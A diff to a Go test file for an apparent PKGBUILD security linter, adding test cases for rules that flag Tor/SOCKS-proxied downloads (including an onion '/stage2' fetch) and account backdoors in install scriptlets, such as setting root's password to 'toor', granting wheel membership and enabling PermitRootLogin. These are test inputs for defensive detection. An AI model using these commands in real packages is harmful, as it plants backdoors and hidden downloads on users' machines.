@@ -242,6 +242,13 @@ sha256sums=('SKIP')`, "")},
 			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make​ all\n}")},
 			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make‮ all\n}")},
 		},
+		"PB310": {
+			low: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  torsocks curl -O https://example.com/x\n}")},
+			high: map[string]string{
+				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
+				"demo.install": "post_install() {\n  curl --socks5-hostname 127.0.0.1:9050 https://example.com/x\n}\n",
+			},
+		},
 		"PB502": {
 			low: map[string]string{
 				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
@@ -1648,6 +1655,41 @@ build() {
 			})
 		}
 	})
+	t.Run("PB310 anonymized fetches", func(t *testing.T) {
+		build := func(line string) map[string]string {
+			return map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n  "+line+"\n}")}
+		}
+		const onion = "duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion"
+		for _, line := range []string{
+			"torsocks curl -O https://example.com/x",
+			"env LC_ALL=C proxychains4 -q wget https://example.com/x",
+			"curl -fsSLx socks5h://127.0.0.1:9050 https://example.com/x",
+			"curl -x socks5://127.0.0.1:9050 https://example.com/x",
+			"curl --proxy=socks4a://127.0.0.1:9050 https://example.com/x",
+			"curl --socks5-hostname 127.0.0.1:9050 https://example.com/x",
+			"ALL_PROXY=socks5h://127.0.0.1:9050 curl https://example.com/x",
+			"export https_proxy=socks5://127.0.0.1:9050",
+			"curl -O http://" + onion + "/stage2",
+			"env ALL_PROXY=socks5h://127.0.0.1:9050 curl https://example.com/x",
+			"wget -e https_proxy=socks5h://127.0.0.1:9050 https://example.com/x",
+			"torsocks -P 9050 -q curl https://example.com/x",
+		} {
+			expectRule(t, "PB310", build(line))
+		}
+		for _, line := range []string{
+			"command -v torsocks >/dev/null",
+			"curl -x http://proxy.example.com:3128 https://example.com/x",
+			"curl -fsSLo out.socks https://example.com/x",
+			"export https_proxy=http://proxy.example.com:3128",
+			"echo see https://example.com/onion.html",
+			"sudo -u torsocks curl -O https://example.com/x", // a user name
+			"env https_proxy=http://proxy.example.com:3128 curl https://example.com/x",
+		} {
+			expectNoRule(t, "PB310", build(line))
+		}
+		expectRule(t, "PB310", map[string]string{"PKGBUILD": pkgbuildWith("",
+			"source+=(\"http://"+onion+"/demo.tar.gz\")\nsha256sums+=('SKIP')")})
+	})
 	t.Run("PB303 printf and echo -e spelling text in escapes", func(t *testing.T) {
 		build := func(line string) map[string]string {
 			return map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n  "+line+"\n}")}
@@ -2414,6 +2456,56 @@ func TestScriptletRules(t *testing.T) {
 		}
 		if !found {
 			t.Errorf("want a PB501 naming the AUR remote, got %v", ruleIDs(fs))
+		}
+	})
+	t.Run("PB502 account backdoors", func(t *testing.T) {
+		scriptlet := func(line string) map[string]string {
+			return map[string]string{"PKGBUILD": base, "demo.install": "post_install() {\n  " + line + "\n}"}
+		}
+		// pb502 returns the severities PB502 reports for line.
+		pb502 := func(line string) []Severity {
+			var got []Severity
+			for _, f := range lint(t, scriptlet(line)) {
+				if f.RuleID == "PB502" {
+					got = append(got, f.Severity)
+				}
+			}
+			return got
+		}
+		for line, want := range map[string]Severity{
+			"echo 'root:toor' | chpasswd":       Critical,
+			"chpasswd < /tmp/creds":             Critical,
+			"printf 'pw\\npw\\n' | passwd demo": Critical,
+			"passwd demo <<< 'pw'":              Critical,
+			"echo pw | passwd --stdin demo":     Critical,
+			"usermod -aG wheel demo":            Critical,
+			"useradd -m -G users,wheel demo":    Critical,
+			"usermod --groups=wheel demo":       Critical,
+			"gpasswd -a demo wheel":             Critical,
+			"gpasswd wheel -a demo":             Critical,
+			"groupmems -g wheel -a demo":        Critical,
+			"usermod -aG wheel -- demo":         Critical,
+			"sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config": Error,
+			"install -m644 /usr/share/demo/sshd.conf /etc/ssh/sshd_config.d/demo.conf": Error,
+		} {
+			if got := pb502(line); !slices.Contains(got, want) {
+				t.Errorf("%s: PB502 %v, want %v", line, got, want)
+			}
+		}
+		// The pkg-backdoor-account-fp shapes.
+		for _, line := range []string{
+			"usermod -aG docker demo",
+			"passwd -l demo",
+			`useradd -r -p "$(openssl passwd -6 x)" demo`,
+			"gpasswd -a demo docker",
+			"useradd -r -s /usr/bin/nologin -G wheelchair demo",
+			"gpasswd -d demo wheel",
+			"groupmems -g docker -a demo",
+			"grep -q PermitRootLogin < /etc/ssh/sshd_config",
+		} {
+			if got := pb502(line); len(got) != 0 {
+				t.Errorf("%s: PB502 %v, want none", line, got)
+			}
 		}
 	})
 	t.Run("PB505 pacman changing packages from a scriptlet", func(t *testing.T) {
